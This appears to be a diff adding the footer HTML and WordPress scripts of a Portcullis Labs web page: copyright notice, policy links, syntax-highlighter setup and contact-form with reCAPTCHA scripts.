+<div class="portcullis-content-layout">
+    <div class="portcullis-content-layout-row">
+    <div class="portcullis-layout-cell" style="width: 100%">
+        <p><br></p>
+        <hr>
+    </div>
+    </div>
+</div>
+<div class="portcullis-content-layout">
+    <div class="portcullis-content-layout-row">
+    <div class="portcullis-layout-cell" style="width: 50%">
+      <p style="text-align: left;"><span style="color: #ffffff; font-size: 12px; font-family: Tahoma;">© Portcullis Computer Security Ltd & Portcullis Inc. All rights reserved. ® 1992 - 2017.</span></p>
+    </div><div class="portcullis-layout-cell" style="width: 50%">
+        <p style="text-align: right;"><span style="color: #ffffff; font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/terms-of-use/">Terms of Use</a> </span>| <span style="color: #ffffff; font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/privacy-and-cookies/">Privacy and Cookies</a></span></p>
+    </div>
+    </div>
+</div></footer>
+
+    </div>
+</div>
+
+
+
+<div id="wp-footer">
+	<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9b'></script>
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushBash.js?ver=3.0.9b'></script>
+<script type='text/javascript'>
+	(function(){
+		var corecss = document.createElement('link');
+		var themecss = document.createElement('link');
+		var corecssurl = "https://labs.portcullis.co.uk/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
+		if ( corecss.setAttribute ) {
+				corecss.setAttribute( "rel", "stylesheet" );
+				corecss.setAttribute( "type", "text/css" );
+				corecss.setAttribute( "href", corecssurl );
+		} else {
+				corecss.rel = "stylesheet";
+				corecss.href = corecssurl;
+		}
+		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
+		var themecssurl = "https://labs.portcullis.co.uk/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeMidnight.css?ver=3.0.9b";
+		if ( themecss.setAttribute ) {
+				themecss.setAttribute( "rel", "stylesheet" );
+				themecss.setAttribute( "type", "text/css" );
+				themecss.setAttribute( "href", themecssurl );
+		} else {
+				themecss.rel = "stylesheet";
+				themecss.href = themecssurl;
+		}
+		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
+		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
+	})();
+	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
+	SyntaxHighlighter.config.strings.help = '?';
+	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
+	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
+	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
+	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
+	SyntaxHighlighter.all();
+</script>
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.23'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"https:\/\/labs.portcullis.co.uk\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"Sending ..."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=3.3.2'></script>
+<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?onload=contact_form_7_recaptcha_callback&#038;render=explicit&#038;ver=1.0.0'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var contact_form_7_recaptcha_data = {"sitekey":"6LdFERITAAAAAJKGS2TEXuWsyOxc-KxvAZBC8zE2"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/plugins/contact-form-7-recaptcha/script.js?ver=1.0.0'></script>
+	<!-- 63 queries. 0.087 seconds. -->
+</div>
+</body>
+</html>
+
